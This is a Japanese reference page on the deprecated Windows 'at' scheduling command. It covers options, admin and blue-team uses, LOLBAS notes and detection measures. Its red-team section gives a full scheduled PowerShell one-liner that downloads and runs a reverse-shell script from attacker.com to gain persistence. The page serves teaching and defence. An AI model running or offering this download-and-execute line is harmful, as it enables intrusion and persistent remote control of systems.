# `at` - コマンドとプログラムの実行をスケジュールする (非推奨)

## 概要

`at` コマンドは、指定した将来の日時に、コマンドやプログラムを**一度だけ**実行するようにスケジュールするためのコマンドです。

**⚠️ 重要**: このコマンドは、Windowsの古いバージョンとの後方互換性のために残されている**レガシー（旧式）**なコマンドです。Microsoftは、より高機能で柔軟な **`schtasks` コマンドの使用を強く推奨**しています。新しいシステムやスクリプトでは `schtasks` を利用してください。

(出自: `Windows標準搭載`)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 (あれば) |
| :--- | :--- | :--- |
| **`schtasks`** | `at` の**モダンな後継**。`schtasks` は、繰り返し（毎日、毎週など）、特定のイベント（ログオン時など）、高度な条件指定など、遥かに柔軟で強力なスケジュール機能を提供します。 | `schtasks` |
| **`start`** | 新しいウィンドウでプログラムやコマンドを**即座に**開始します。`at` は**予約実行**です。 | - |

## スイッチ/オプション説明

| スイッチ/オプション | 説明 |
| :--- | :--- |
| **`\\<computername>`** | リモートコンピュータを指定して、そのコンピュータ上でタスクをスケジュールします。 |
| **`<time>`** | `HH:MM` (24時間表記) の形式で、コマンドを実行する時刻を指定します。 |
| **`/interactive`** | ジョブの実行時に、そのジョブがデスクトップと対話できるようにします。 |
| **`/every:<date>`** | ジョブを毎週または毎月指定した日に実行します。（例: `/every:M,T,W,Th,F`） |
| **`/next:<date>`** | 次に来る指定した曜日にジョブを実行します。（例: `/next:Monday`） |
| **`"<command>"`** | 実行するコマンド、プログラム、またはバッチファイルを指定します。 |
| **`id`** | スケジュールされたジョブに割り当てられたID番号。 |
| **`/delete`** | スケジュールされたジョブをキャンセルします。IDを指定しない場合は、すべてのジョブをキャンセルします。 |
| **`/yes`** | ジョブをキャンセルする際の確認プロンプトに対して、自動的に "yes" と応答します。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 業務時間外の深夜2時に、サーバーの再起動を一度だけスケジュールする。
* **組み合わせ**: `at <time> "<command>"`
* **解説**: サービスへの影響を最小限に抑えるため、ユーザーがいない時間帯にメンテナンス作業を予約します。
* **例**:

    ```cmd
    REM 明日の午前2時にサーバーを再起動するようにスケジュール
    at 02:00 /next: "shutdown /r /t 0"
    ```

### 2. ブルーチーム視点

* **タスク**: システムに不審な `at` ジョブがスケジュールされていないか監査する。
* **組み合わせ**: `at`
* **解説**: 攻撃者は永続化の手段として、`cron` や `systemd timers` と同様に `at` (`schtasks`) を利用することがあります。`at` コマンドを引数なしで実行して、現在スケジュールされているジョブの一覧を確認し、見慣れないコマンドやスクリプトが登録されていないかを調査します。
* **例**:

    ```cmd
    REM 現在スケジュールされているatジョブを一覧表示
    at
    ```

### 3. レッドチーム視点

* **タスク**: **永続化 (Persistence)** のために、指定時刻にリバースシェルを起動するジョブを仕掛ける。
* **組み合わせ**: `at <time> "<command>"`
* **解説**: 侵入したシステムで、`schtasks` ほど頻繁に監視されていない可能性がある `at` を利用して、バックドアを仕掛けます。
* **シナリオ**: 管理者が活動していない深夜帯に、攻撃者のC2サーバーへリバースシェルを接続するコマンドを予約します。
* **例**:

    ```cmd
    REM 次の日の午後10時に、powershellでリバースシェルを起動するジョブを仕掛ける
    at 22:00 /next: "powershell -c \"iex(new-object net.webclient).downloadstring('[http://attacker.com/rev.ps1](http://attacker.com/rev.ps1)')\""
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `Access is denied.`
    * **考えられる原因**: `at` ジョブの作成や削除には管理者権限が必要です。
    * **解決策**: コマンドプロンプトを「管理者として実行」して、再度コマンドを実行してください。

2. **エラーメッセージ**: `The AT command has been deprecated. Please use schtasks.exe instead.`
    * **考えられる原因**: これはエラーではなく、Windowsが `at` の代わりに `schtasks` を使うように促す警告メッセージです。
    * **解決策**: 新しいスクリプトやタスクでは、`schtasks` の利用に切り替えることを検討してください。

## 関連する設定

* **Task Scheduler サービス**: `at` コマンドが機能するためには、「Task Scheduler」サービスが実行中である必要があります。`sc query schedule` や `services.msc` で確認できます。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **永続化**: レッドチームのシナリオで述べた通り、`at` は攻撃者がシステム上での永続化を確立するための古典的な手法です。一度root/Administrator権限を奪取すれば、`at` や `schtasks` を使って、システムが再起動しても自身のマルウェアが再度実行されるように仕掛けることができます。

### LOLBAS (Living Off The Land Binaries and Scripts) における利用例

* **機能**: **永続化 (Persistence)**, **コード実行 (Execution)**
* **解説**: `at` はWindowsに標準搭載されている正規のコマンドであり、攻撃者はアンチウイルス製品に検知されにくい「環境寄生型」の攻撃手法としてこれを利用します。
* **参照**: [https://lolbas-project.github.io/lolbas/Binaries/At/](https://lolbas-project.github.io/lolbas/Binaries/At/)

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 最小権限の原則を適用し、不要なユーザーにタスクをスケジュールする権限を与えない。
* **Detection (検知)**: `at` コマンドの実行（プロセス作成イベントID 4688など）や、タスクスケジューラのイベントログ (イベントID 106, 140など) を監視し、不審なジョブの登録を検知する。

## 注意点・補足

* **`schtasks` への移行**: `at` は非常に基本的な機能しか提供しません。繰り返し実行、イベントトリガー（ログオン時など）、詳細な権限設定などが必要な場合は、必ず `schtasks` を使用してください。
